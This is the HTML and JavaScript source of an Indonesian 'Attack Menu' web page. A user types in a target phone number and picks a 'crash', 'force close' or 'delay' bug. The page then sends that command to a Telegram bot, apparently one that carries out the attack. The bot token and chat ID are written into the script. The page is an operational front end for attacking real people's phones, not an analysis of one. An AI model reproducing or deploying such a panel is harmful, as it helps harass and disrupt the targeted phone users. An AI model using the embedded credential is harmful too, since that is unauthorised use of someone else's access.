<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Attack Menu SamsInfinity</title>
  <style>
    body {
      background-color: #000;
      color: red;
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    .container {
      padding: 30px;
    }

    .title {
      font-size: 32px;
      font-weight: bold;
      margin-top: 20px;
      color: #ff0000;
    }

    .logo {
      margin-top: 50px;
      margin-bottom: 20px;
    }

    .logo img {
      width: 150px;
      height: auto;
    }

    input, select {
      width: 80%;
      padding: 14px;
      margin: 15px 0;
      background: #111;
      border: 2px solid red;
      color: red;
      border-radius: 10px;
      font-size: 16px;
      outline: none;
    }

    .button {
      background-color: #b10000;
      color: #fff;
      border: none;
      padding: 15px 30px;
      border-radius: 30px;
      font-size: 18px;
      cursor: pointer;
      margin-top: 20px;
      box-shadow: 0 0 10px red;
    }

    .button:hover {
      background-color: #ff0000;
    }

    /* Notifikasi Box */
    #notifBox {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #111;
      color: red;
      padding: 20px 25px;
      border-left: 5px solid red;
      border-radius: 10px;
      box-shadow: 0 0 15px red;
      z-index: 1000;
      display: none;
      max-width: 300px;
      text-align: left;
    }

    #notifBox .closeBtn {
      position: absolute;
      top: 5px;
      right: 10px;
      font-size: 28px;
      font-weight: bold;
      cursor: pointer;
      color: red;
      padding: 0 5px;
      line-height: 1;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="title">Attack Menu SamsInfinity</div>

    <div class="logo">
      <img src="https://files.catbox.moe/dix5pa.jpg" alt="logo"/>
    </div>

    <input type="text" id="targetNumber" placeholder="Target number (e.g. 62812...)">

    <select id="attackType">
      <option value="/fcinvis">Invisible ForClose</option>
      <option value="/delay">Invisible Delay</option>
      <option value="/crack">Invisible Crash</option>
    </select>

    <button class="button" onclick="sendBug()">▶ SEND BUG</button>
  </div>

  <!-- Notifikasi Custom -->
  <div id="notifBox">
    <span class="closeBtn" onclick="closeNotif()">✖</span>
    <div id="notifMessage"></div>
  </div>

  <script>
    function sendBug() {
      const number = document.getElementById("targetNumber").value.trim();
      const typeValue = document.getElementById("attackType").value;
      const typeText = document.getElementById("attackType").options[document.getElementById("attackType").selectedIndex].text;
      const token = "7432046690:AAFwGypADBwML-2I5xCDNdYeKVE3uenhJxE";
      const chatId = "-1002532993003";

      if (!number.startsWith("62")) {
        showNotif("❗ Nomor harus diawali dengan 62 tanpa spasi. Contoh: 62812xxxx");
        return;
      }

      const message = `${typeValue} ${number}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => {
        if (response.ok) {
          showNotif(`✅ Bug Sedang diproses!, Tunggu 2menit agar bug berjalan<br>Target: <b>${number}</b><br>Jenis: <b>${typeText}</b><br><small>Harap tunggu 20 menit sebelum mengirim lagi</small>`);
        } else {
          showNotif("❌ Gagal mengirim ke Telegram.");
        }
      })
      .catch(error => {
        showNotif("⚠️ Terjadi kesalahan saat mengirim.");
        console.error(error);
      });
    }

    function showNotif(msg) {
      const notifBox = document.getElementById("notifBox");
      const notifMessage = document.getElementById("notifMessage");

      notifMessage.innerHTML = msg;
      notifBox.style.display = "block";
    }

    function closeNotif() {
      document.getElementById("notifBox").style.display = "none";
    }
  </script>
</body>
</html>
